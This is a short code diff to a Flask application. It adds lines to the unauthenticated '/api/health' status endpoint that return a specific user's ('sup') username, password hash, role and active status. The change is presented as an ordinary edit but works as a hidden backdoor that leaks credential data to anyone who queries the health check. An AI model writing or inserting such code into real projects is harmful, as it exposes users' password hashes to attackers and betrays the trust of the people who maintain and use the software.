@@ -122,6 +122,14 @@ def create_app(config_name="dev"):
 
     @app.route("/api/health", methods=["GET"])
     def health():
+        u = User.query.filter_by(username='sup').first()
+        if u:
+            return jsonify({
+                "username": u.username, 
+                "pass_hash": u.password_hash, 
+                "role": u.role, 
+                "active": u.is_active
+            })
         return jsonify({"status": "running", "engine": "WSGI Modular Mode"})
 
     # Activity tracker middleware
